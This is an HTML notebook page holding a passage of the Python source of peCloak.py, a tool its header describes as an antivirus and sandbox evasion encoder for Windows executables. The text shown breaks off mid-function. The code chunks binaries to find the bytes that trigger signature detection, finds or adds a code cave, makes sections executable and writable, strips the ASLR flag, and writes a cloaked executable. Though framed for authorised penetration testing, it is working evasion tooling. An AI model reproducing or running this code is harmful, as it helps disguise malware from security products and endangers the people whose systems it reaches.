<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>peCloack.py</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">peCloack.py</h1><br/><div class="codebox"><div class="codebox"><span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br /><br /><span style="color:#3ad900;font-weight:400">'''&nbsp;<br />peCloak.py&nbsp;(beta)&nbsp;-&nbsp;A&nbsp;Multi-Pass&nbsp;Encoder&nbsp;&amp;&nbsp;Heuristic&nbsp;Sandbox&nbsp;Bypass&nbsp;AV&nbsp;Evasion&nbsp;Tool<br />Copyright&nbsp;(C)&nbsp;2015&nbsp;&nbsp;Mike&nbsp;Czumak&nbsp;|&nbsp;T_V3rn1x&nbsp;|&nbsp;@SecuritySift<br />--------------------------------------------------------------------<br />LICENSE/WARRANTY:&nbsp;This&nbsp;program&nbsp;is&nbsp;free&nbsp;software:&nbsp;you&nbsp;can&nbsp;redistribute&nbsp;<br />it&nbsp;and/or&nbsp;modify&nbsp;it&nbsp;under&nbsp;the&nbsp;terms&nbsp;of&nbsp;the&nbsp;GNU&nbsp;General&nbsp;Public&nbsp;License&nbsp;<br />as&nbsp;published&nbsp;by&nbsp;the&nbsp;Free&nbsp;Software&nbsp;Foundation,&nbsp;either&nbsp;version&nbsp;3&nbsp;of&nbsp;the&nbsp;<br />License,&nbsp;or(at&nbsp;your&nbsp;option)&nbsp;any&nbsp;later&nbsp;version.<br /><br />This&nbsp;program&nbsp;is&nbsp;distributed&nbsp;in&nbsp;the&nbsp;hope&nbsp;that&nbsp;it&nbsp;will&nbsp;be&nbsp;useful,<br />but&nbsp;WITHOUT&nbsp;ANY&nbsp;WARRANTY;&nbsp;without&nbsp;even&nbsp;the&nbsp;implied&nbsp;warranty&nbsp;of<br />MERCHANTABILITY&nbsp;or&nbsp;FITNESS&nbsp;FOR&nbsp;A&nbsp;PARTICULAR&nbsp;PURPOSE.&nbsp;&nbsp;See&nbsp;the<br />GNU&nbsp;General&nbsp;Public&nbsp;License&nbsp;for&nbsp;more&nbsp;details.<br /><br />You&nbsp;can&nbsp;obtain&nbsp;a&nbsp;copy&nbsp;of&nbsp;the&nbsp;GNU&nbsp;General&nbsp;Public&nbsp;License&nbsp;from:<br />http://www.gnu.org/licenses/.<br />--------------------------------------------------------------------<br />DISCLAIMER:&nbsp;This&nbsp;program&nbsp;is&nbsp;intended&nbsp;for&nbsp;use&nbsp;in&nbsp;research,&nbsp;<br />sanctioned&nbsp;penetration&nbsp;testing,&nbsp;or&nbsp;other&nbsp;authorized&nbsp;security-related&nbsp;purposes.&nbsp;<br />Do&nbsp;not&nbsp;use&nbsp;this&nbsp;code&nbsp;or&nbsp;any&nbsp;derivative&nbsp;of&nbsp;it&nbsp;for&nbsp;illegal&nbsp;or&nbsp;otherwise&nbsp;<br />unauthorized&nbsp;activities.&nbsp;<br />--------------------------------------------------------------------<br />PURPOSE&nbsp;AND&nbsp;USAGE&nbsp;EXAMPLES:&nbsp;Please&nbsp;visit&nbsp;www.securitysift.com&nbsp;<br />for&nbsp;additional&nbsp;details&nbsp;and&nbsp;the&nbsp;latest&nbsp;version&nbsp;of&nbsp;this&nbsp;code.<br /><br />Please&nbsp;note&nbsp;the&nbsp;external&nbsp;code&nbsp;dependencies:&nbsp;pydasm,&nbsp;pefile,&nbsp;SectionDoubleP&nbsp;<br />'''</span><br /><br /><span style="color:#333333;font-weight:400">import</span>&nbsp;os,&nbsp;sys,&nbsp;getopt<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;pefile<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;pydasm<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;re<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;binascii&nbsp;<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;time,&nbsp;datetime<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;random<br /><span style="color:#333333;font-weight:400">from</span>&nbsp;random&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;randint<br /><span style="color:#333333;font-weight:400">from</span>&nbsp;SectionDoubleP&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;*<br /><br /><span style="color:#3ad900;font-weight:400">'''<br />	Split&nbsp;a&nbsp;file&nbsp;into&nbsp;chunks&nbsp;of&nbsp;designated&nbsp;size.&nbsp;Might&nbsp;be&nbsp;useful&nbsp;if&nbsp;simple&nbsp;encoding&nbsp;of&nbsp;the&nbsp;<br />	text/code&nbsp;section&nbsp;is&nbsp;ineffective&nbsp;and&nbsp;you&nbsp;need&nbsp;to&nbsp;locate&nbsp;the&nbsp;offending&nbsp;portions<br />	of&nbsp;the&nbsp;pe&nbsp;file&nbsp;that&nbsp;are&nbsp;triggering&nbsp;signature-based&nbsp;detection<br />'''</span><br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;chunk_file&nbsp;(<span style="color:#ff9d00;font-weight:700">file</span>,&nbsp;chunk_size):<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;make&nbsp;folder&nbsp;to&nbsp;hold&nbsp;file&nbsp;chunks</span><br />	target_directory&nbsp;=&nbsp;os.path.splitext(<span style="color:#ff9d00;font-weight:700">file</span>)[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"_cloaked"</span><br />	timestamp&nbsp;=&nbsp;datetime.datetime.now().strftime(<span style="color:#3ad900;font-weight:400">'%Y%m%d%H%M%S'</span>)<br />	target_directory&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"_"</span>&nbsp;+&nbsp;timestamp<br />	<br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">not</span>&nbsp;os.path.exists(target_directory):<br />		os.makedirs(target_directory)<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Target&nbsp;directory&nbsp;[%s]&nbsp;created"</span>&nbsp;%&nbsp;target_directory<br />	<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Attempting&nbsp;to&nbsp;chunk&nbsp;file&nbsp;[%s]&nbsp;to&nbsp;target&nbsp;directory"</span>&nbsp;%&nbsp;(<span style="color:#ff9d00;font-weight:700">file</span>)<br />		<br />	<span style="color:#ff9d00;font-weight:700">with</span>&nbsp;<span style="color:#ff9d00;font-weight:700">open</span>(<span style="color:#ff9d00;font-weight:700">file</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"rb"</span>)&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;f:<br />		byte&nbsp;=&nbsp;f.read(<span style="color:#ff0044;font-weight:400">1</span>)<br />		byte_count&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />		chunk_count&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />		chunk&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />		<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;byte&nbsp;!=&nbsp;<span style="color:#3ad900;font-weight:400">""</span>:<br />			<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;byte_count&nbsp;&lt;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(chunk_size):<br />				chunk&nbsp;+=&nbsp;byte<br />				<br />			<span style="color:#ff9d00;font-weight:700">else</span>:<br />				<span style="color:#0088ff;font-weight:400">#&nbsp;write&nbsp;to&nbsp;file&nbsp;and&nbsp;create&nbsp;new&nbsp;chunk</span><br />				chunk_count&nbsp;+=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />				<span style="color:#ff9d00;font-weight:700">with</span>&nbsp;<span style="color:#ff9d00;font-weight:700">open</span>(target_directory+<span style="color:#3ad900;font-weight:400">"\\chunk_"</span>+<span style="color:#ff9d00;font-weight:700">str</span>(chunk_count),&nbsp;<span style="color:#3ad900;font-weight:400">'wb'</span>)&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;output:<br />					output.write(chunk)<br />				<br />				<span style="color:#0088ff;font-weight:400">#&nbsp;reset&nbsp;counters</span><br />				chunk&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />				byte_count&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />				<br />			byte_count&nbsp;+=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />			byte&nbsp;=&nbsp;f.read(<span style="color:#ff0044;font-weight:400">1</span>)<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;A&nbsp;total&nbsp;of&nbsp;%i&nbsp;bytes&nbsp;chunked&nbsp;into&nbsp;%i&nbsp;separate&nbsp;files"</span>&nbsp;%&nbsp;(byte_count,&nbsp;chunk_count)<br />	<br /><span style="color:#3ad900;font-weight:400">'''<br />	Get&nbsp;entry&nbsp;offset&nbsp;and&nbsp;address<br />	from&nbsp;pefile&nbsp;usage&nbsp;example&nbsp;on&nbsp;code.google.com<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;get_entry&nbsp;(pe):<br />	ep&nbsp;=&nbsp;pe.OPTIONAL_HEADER.AddressOfEntryPoint<br />	ep_ava&nbsp;=&nbsp;ep+pe.OPTIONAL_HEADER.ImageBase<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;ep,&nbsp;ep_ava&nbsp;<br />	<br /><span style="color:#3ad900;font-weight:400">'''<br />	List&nbsp;all&nbsp;sections&nbsp;in&nbsp;the&nbsp;pe&nbsp;file<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;get_sections(pe):<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;PE&nbsp;Section&nbsp;Information&nbsp;Summary:"</span><br />	<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;section&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;pe.sections:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\t[+]&nbsp;Name:&nbsp;%s,&nbsp;Virtual&nbsp;Address:&nbsp;%s,&nbsp;Virtual&nbsp;Size:&nbsp;%s,&nbsp;Characteristics:&nbsp;%s"</span>&nbsp;%&nbsp;(section.Name,&nbsp;<br />																		&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(section.VirtualAddress),&nbsp;<br />																		&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(section.Misc_VirtualSize),<br />																		&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(section.Characteristics))<br />	<span style="color:#ff9d00;font-weight:700">return</span><br /><span style="color:#3ad900;font-weight:400">'''<br />	Get&nbsp;section&nbsp;header&nbsp;for&nbsp;named&nbsp;section<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;get_section_header(pe,&nbsp;section_name):<br />	<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;section&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;pe.sections:<br />		<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;section_name.strip().lower()&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;section.Name.strip().lower():<br />			<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;section<br /><br /><span style="color:#3ad900;font-weight:400">'''&nbsp;<br />	print&nbsp;image&nbsp;and&nbsp;section&nbsp;header(s)&nbsp;<br />'''</span>			<br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;get_info(pe,&nbsp;section):<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Printing&nbsp;pe&nbsp;file&nbsp;info...\n"</span><br />	get_sections(pe)<br />	<span style="color:#ff9d00;font-weight:700">print</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;pe.OPTIONAL_HEADER<br />	<br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;section&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"all"</span>:<br />		<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;section&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;pe.sections:<br />			header&nbsp;=&nbsp;get_section_header(pe,&nbsp;section.Name)<br />			<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;header<br />	<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;section&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"none"</span>:<br />		<span style="color:#ff9d00;font-weight:700">return</span><br />	<span style="color:#ff9d00;font-weight:700">else</span>:<br />		header&nbsp;=&nbsp;get_section_header(pe,&nbsp;section)<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;header<br /><br /><span style="color:#3ad900;font-weight:400">'''&nbsp;<br />	Looks&nbsp;for&nbsp;a&nbsp;section&nbsp;of&nbsp;enough&nbsp;successive&nbsp;null&nbsp;bytes&nbsp;to&nbsp;act&nbsp;as&nbsp;<br />	a&nbsp;suitable&nbsp;location&nbsp;for&nbsp;the&nbsp;code&nbsp;cave&nbsp;within&nbsp;the&nbsp;existing&nbsp;sections<br />	so&nbsp;we&nbsp;don't&nbsp;have&nbsp;to&nbsp;add&nbsp;a&nbsp;new&nbsp;section.&nbsp;Skip&nbsp;this&nbsp;step&nbsp;with&nbsp;the&nbsp;-a&nbsp;option<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;find_codecave_space(pe,&nbsp;required_space):<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Searching&nbsp;for&nbsp;suitable&nbsp;code&nbsp;cave&nbsp;location..."</span><br />	<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;section&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;pe.sections:<br />		section_header&nbsp;=&nbsp;section<br />		section_name&nbsp;=&nbsp;section_header.Name<br />		virtual_address&nbsp;=&nbsp;section_header.VirtualAddress<br />		code_cave_section&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />		virtual_offset&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />		raw_offset&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />		<br />		data_to_search&nbsp;=&nbsp;retrieve_data(pe,&nbsp;section_name,&nbsp;<span style="color:#3ad900;font-weight:400">"raw"</span>)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;grab&nbsp;raw&nbsp;data&nbsp;from&nbsp;section</span><br />						<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\t[+]&nbsp;Searching&nbsp;%s&nbsp;section..."</span>&nbsp;%&nbsp;section_name<br />		<br />		<span style="color:#0088ff;font-weight:400">#&nbsp;search&nbsp;for&nbsp;code&nbsp;cave</span><br />		null_count&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>		<br />		byte_count&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />		<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;byte&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;data_to_search:<br />			<br />			<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;byte&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"00"</span>:<br />				null_count&nbsp;+=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />				<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;null_count&nbsp;&gt;=&nbsp;required_space:&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;we've&nbsp;hit&nbsp;our&nbsp;required&nbsp;space&nbsp;limit</span><br />					raw_offset&nbsp;=&nbsp;byte_count&nbsp;-&nbsp;null_count&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">2</span>&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;calculate&nbsp;the&nbsp;raw&nbsp;offset&nbsp;of&nbsp;the&nbsp;code&nbsp;cave&nbsp;for&nbsp;writing&nbsp;</span><br />					virtual_offset&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">"L"</span>,(raw_offset)&nbsp;+&nbsp;virtual_address&nbsp;-&nbsp;pe.OPTIONAL_HEADER.AddressOfEntryPoint)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;calculate&nbsp;the&nbsp;virtual&nbsp;offset</span><br />					code_cave_section&nbsp;=&nbsp;section_header.Name<br />					<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\t[+]&nbsp;At&nbsp;least&nbsp;%i&nbsp;null&nbsp;bytes&nbsp;found&nbsp;in&nbsp;%s&nbsp;section&nbsp;to&nbsp;host&nbsp;code&nbsp;cave"</span>&nbsp;%&nbsp;(null_count,&nbsp;code_cave_section)<br />					make_section_writeable(pe,&nbsp;code_cave_section)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;section&nbsp;at&nbsp;least&nbsp;needs&nbsp;to&nbsp;be&nbsp;executable,&nbsp;currently&nbsp;make&nbsp;it&nbsp;writeable&nbsp;also</span><br />					<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;virtual_offset,&nbsp;raw_offset,&nbsp;code_cave_section<br />			<span style="color:#ff9d00;font-weight:700">else</span>:<br />				null_count&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />			byte_count&nbsp;+=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />			<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\t[+]&nbsp;No&nbsp;suitable&nbsp;code&nbsp;cave&nbsp;space&nbsp;found,&nbsp;creating&nbsp;a&nbsp;new&nbsp;section"</span><br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;virtual_offset,&nbsp;raw_offset,&nbsp;code_cave_section<br /><br /><span style="color:#3ad900;font-weight:400">'''<br />	find&nbsp;(or&nbsp;make)&nbsp;location&nbsp;for&nbsp;code_cave<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;get_code_cave&nbsp;(pe,&nbsp;skip_cave_search):<br />	<br />	code_cave_virtual_offset&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;if&nbsp;we&nbsp;want&nbsp;to&nbsp;try&nbsp;to&nbsp;search&nbsp;for&nbsp;an&nbsp;existing&nbsp;suitable&nbsp;code&nbsp;cave&nbsp;location...</span><br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;skip_cave_search&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">False</span>:<br />		code_cave_virtual_offset,&nbsp;code_cave_raw_offset,&nbsp;code_cave_section&nbsp;=&nbsp;find_codecave_space(pe,&nbsp;<span style="color:#ff0044;font-weight:400">1000</span>)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;look&nbsp;for&nbsp;at&nbsp;least&nbsp;1000&nbsp;consecutive&nbsp;null&nbsp;bytes</span><br />	<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;if&nbsp;the&nbsp;code&nbsp;cave&nbsp;search&nbsp;was&nbsp;skipped&nbsp;or&nbsp;did&nbsp;not&nbsp;find&nbsp;a&nbsp;suitable&nbsp;code&nbsp;cave&nbsp;location...</span><br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;code_cave_virtual_offset&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Creating&nbsp;new&nbsp;section&nbsp;for&nbsp;code&nbsp;cave..."</span><br />		sections&nbsp;=&nbsp;SectionDoubleP(pe)<br />		code_cave_section&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">".NewSec"</span><br />		pe&nbsp;=&nbsp;sections.push_back(code_cave_section,&nbsp;VirtualSize=<span style="color:#ff0044;font-weight:400">0x00001000</span>,&nbsp;RawSize=<span style="color:#ff0044;font-weight:400">0x00001000</span>)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;add&nbsp;new&nbsp;section&nbsp;to&nbsp;the&nbsp;file</span><br />		<span style="color:#ff9d00;font-weight:700">try</span>:<br />			section_header&nbsp;=&nbsp;get_section_header(pe,&nbsp;code_cave_section)<br />			code_cave_virtual_address&nbsp;=&nbsp;section_header.VirtualAddress<br />			code_cave_virtual_offset&nbsp;=&nbsp;get_virtual_offset(code_cave_virtual_address,&nbsp;pe)<br />			code_cave_raw_offset&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>		<br />		<span style="color:#ff9d00;font-weight:700">except</span>:<br />			<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Could&nbsp;not&nbsp;retrieve&nbsp;created&nbsp;code&nbsp;cave&nbsp;location.&nbsp;Check&nbsp;write&nbsp;permissions&nbsp;and&nbsp;try&nbsp;again."</span><br />			sys.exit(<span style="color:#ff0044;font-weight:400">2</span>)<br />			<br />	code_cave_address&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(pe.OPTIONAL_HEADER.ImageBase&nbsp;+&nbsp;pe.OPTIONAL_HEADER.AddressOfEntryPoint&nbsp;+&nbsp;struct.unpack(<span style="color:#3ad900;font-weight:400">"L"</span>,code_cave_virtual_offset)[<span style="color:#ff0044;font-weight:400">0</span>])<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Code&nbsp;cave&nbsp;located&nbsp;at&nbsp;%s"</span>&nbsp;%&nbsp;(code_cave_address)	<br />	<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;pe,&nbsp;code_cave_address,&nbsp;code_cave_virtual_offset,&nbsp;code_cave_raw_offset,&nbsp;code_cave_section<br />	<br /><span style="color:#3ad900;font-weight:400">'''<br />	Since&nbsp;we&nbsp;use&nbsp;the&nbsp;entry&nbsp;point&nbsp;and&nbsp;file&nbsp;base&nbsp;as&nbsp;our&nbsp;relative&nbsp;addresses,&nbsp;we&nbsp;need&nbsp;to&nbsp;<br />	be&nbsp;sure&nbsp;they&nbsp;won't&nbsp;be&nbsp;changed&nbsp;by&nbsp;ASLR.&nbsp;Function&nbsp;snippet&nbsp;adopted&nbsp;from&nbsp;<br />	https://github.com/0vercl0k/stuffz/blob/master/remove_aslr_bin.py<br />'''</span>			<br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;disable_aslr(pe):<br />	IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE&nbsp;&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0x40</span>&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;flag&nbsp;indicates&nbsp;relocation&nbsp;at&nbsp;run&nbsp;time</span><br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(pe.OPTIONAL_HEADER.DllCharacteristics&nbsp;&amp;&nbsp;IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE):<br />		pe.OPTIONAL_HEADER.DllCharacteristics&nbsp;&amp;=&nbsp;~IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;ASLR&nbsp;disabled"</span><br />	<span style="color:#ff9d00;font-weight:700">else</span>:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;ASLR&nbsp;not&nbsp;enabled"</span><br /><br /><span style="color:#3ad900;font-weight:400">'''<br />	Save&nbsp;modified&nbsp;pe&nbsp;file<br />'''</span><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;save_cloaked_pe(pe,&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>):<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">try</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ts&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(time.time())<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fname&nbsp;=&nbsp;os.path.splitext(<span style="color:#ff9d00;font-weight:700">file</span>)[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"_"</span>&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">str</span>(ts)&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"_cloaked.exe"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pe.write(pe.OPTIONAL_HEADER.SizeOfHeaders,&nbsp;filename=fname)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;MODIFIED&nbsp;WRITE&nbsp;FUNCTION&nbsp;IN&nbsp;PEFILE!!!</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;New&nbsp;file&nbsp;saved&nbsp;["</span>&nbsp;+&nbsp;fname&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"]"</span>	<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">except</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;ERROR:&nbsp;Could&nbsp;not&nbsp;save&nbsp;modified&nbsp;PE&nbsp;file.&nbsp;Check&nbsp;write&nbsp;permissions&nbsp;and&nbsp;ensure&nbsp;the&nbsp;file&nbsp;is&nbsp;not&nbsp;in&nbsp;use"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(<span style="color:#ff0044;font-weight:400">2</span>)<br />		<br /><span style="color:#3ad900;font-weight:400">'''&nbsp;<br />	print&nbsp;a&nbsp;range&nbsp;of&nbsp;bytes&nbsp;(in&nbsp;hex&nbsp;and&nbsp;ascii)&nbsp;for&nbsp;the&nbsp;named&nbsp;section<br />	starting&nbsp;at&nbsp;a&nbsp;given&nbsp;offset&nbsp;of&nbsp;the&nbsp;section&nbsp;start&nbsp;address<br />	The&nbsp;offset&nbsp;and&nbsp;byte&nbsp;count&nbsp;to&nbsp;print&nbsp;are&nbsp;handled&nbsp;so&nbsp;the&nbsp;user&nbsp;can&nbsp;<br />	provide&nbsp;either&nbsp;a&nbsp;hex&nbsp;or&nbsp;a&nbsp;decimal&nbsp;value&nbsp;for&nbsp;either&nbsp;(interchangeable)<br />'''</span>	<br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;print_section_bytes(pe,&nbsp;section_range):<br />	<br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;section_range:<br />			<span style="color:#ff9d00;font-weight:700">try</span>:<br />				<span style="color:#0088ff;font-weight:400">#&nbsp;get&nbsp;name&nbsp;of&nbsp;section,&nbsp;range&nbsp;of&nbsp;bytes&nbsp;to&nbsp;print,&nbsp;header&nbsp;and&nbsp;virtual&nbsp;start&nbsp;address</span><br />				section_name&nbsp;=&nbsp;section_range.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">0</span>].lower().strip()<br />				start&nbsp;=&nbsp;section_range.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">1</span>].strip()<br />				stop&nbsp;=&nbsp;section_range.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">2</span>].strip()<br />				<br />				<span style="color:#0088ff;font-weight:400">#&nbsp;handle&nbsp;hex&nbsp;conversion&nbsp;for&nbsp;either&nbsp;start/end&nbsp;value</span><br />				<span style="color:#ff9d00;font-weight:700">try</span>:&nbsp;<br />					format&nbsp;=&nbsp;start.split(<span style="color:#3ad900;font-weight:400">"h"</span>)[<span style="color:#ff0044;font-weight:400">1</span>]<br />					num1&nbsp;=&nbsp;start.split(<span style="color:#3ad900;font-weight:400">"h"</span>)[<span style="color:#ff0044;font-weight:400">0</span>]<br />					start&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(num1.strip(),&nbsp;<span style="color:#ff0044;font-weight:400">16</span>)<br />				<span style="color:#ff9d00;font-weight:700">except</span>:<br />					start&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(start.strip())<br />					<br />				<span style="color:#ff9d00;font-weight:700">try</span>:&nbsp;<br />					format&nbsp;=&nbsp;stop.split(<span style="color:#3ad900;font-weight:400">"h"</span>)[<span style="color:#ff0044;font-weight:400">1</span>]<br />					num2&nbsp;=&nbsp;stop.split(<span 